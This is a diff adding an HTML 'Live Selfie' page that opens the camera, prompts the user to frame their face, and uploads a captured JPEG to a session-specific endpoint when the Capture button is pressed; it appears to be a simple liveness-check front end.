@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Live Selfie</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    html, body {
+      margin: 0;
+      background: #000;
+      color: white;
+      font-family: Arial, sans-serif;
+      overflow: hidden;
+    }
+
+    #container {
+      position: relative;
+      width: 100vw;
+      height: 100vh;
+    }
+
+    video {
+      width: 100vw;
+      height: 100vh;
+      object-fit: cover;
+    }
+
+    #circle {
+      position: absolute;
+      width: 70vw;
+      height: 70vw;
+      border: 4px solid rgba(0,255,0,0.8);
+      border-radius: 50%;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      box-shadow: 0 0 20px rgba(0,255,0,0.5);
+    }
+
+    #prompt {
+      position: absolute;
+      bottom: 15%;
+      width: 100%;
+      text-align: center;
+      font-size: 1.5em;
+      font-weight: bold;
+      text-shadow: 0 0 10px black;
+    }
+
+    #status {
+      position: absolute;
+      top: 10px;
+      left: 10px;
+      font-size: 1em;
+      background: rgba(0,0,0,0.6);
+      padding: 6px 10px;
+      border-radius: 6px;
+    }
+
+    #capture {
+      position: absolute;
+      bottom: 8%;
+      left: 50%;
+      transform: translateX(-50%);
+      padding: 14px 22px;
+      background-color: #00cc00;
+      color: white;
+      border: none;
+      border-radius: 50px;
+      font-size: 1em;
+      box-shadow: 0 0 10px #00cc00;
+    }
+  </style>
+</head>
+<body>
+  <div id="container">
+    <video id="camera" autoplay playsinline></video>
+    <div id="circle"></div>
+    <div id="prompt">Face must be in circle</div>
+    <div id="status">Initializing...</div>
+    <button id="capture">Capture</button>
+  </div>
+
+  <script>
+    const video = document.getElementById('camera');
+    const prompt = document.getElementById('prompt');
+    const statusBox = document.getElementById('status');
+    const captureBtn = document.getElementById('capture');
+
+    let currentPromptIndex = 0;
+    const prompts = ["Face must be in circle", "Move closer", "Look at the screen"];
+
+    setInterval(() => {
+      currentPromptIndex = (currentPromptIndex + 1) % prompts.length;
+      prompt.textContent = prompts[currentPromptIndex];
+    }, 3000);
+
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+        statusBox.textContent = "📷 Camera Ready";
+      })
+      .catch(err => {
+        statusBox.textContent = "❌ Camera error: " + err.message;
+      });
+
+    captureBtn.onclick = () => {
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+      const base64 = canvas.toDataURL('image/jpeg');
+
+      statusBox.textContent = "⏳ Uploading selfie...";
+
+      const sessionId = new URLSearchParams(location.search).get("session");
+      fetch(`https://spidey-liveness.onrender.com/upload/${sessionId}`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ image: base64 })
+      })
+      .then(res => {
+        if (res.ok) {
+          statusBox.textContent = "✅ Selfie uploaded!";
+        } else {
+          throw new Error("Upload failed");
+        }
+      })
+      .catch(err => {
+        statusBox.textContent = "❌ " + err.message;
+      });
+    };
+  </script>
+</body>
+</html>
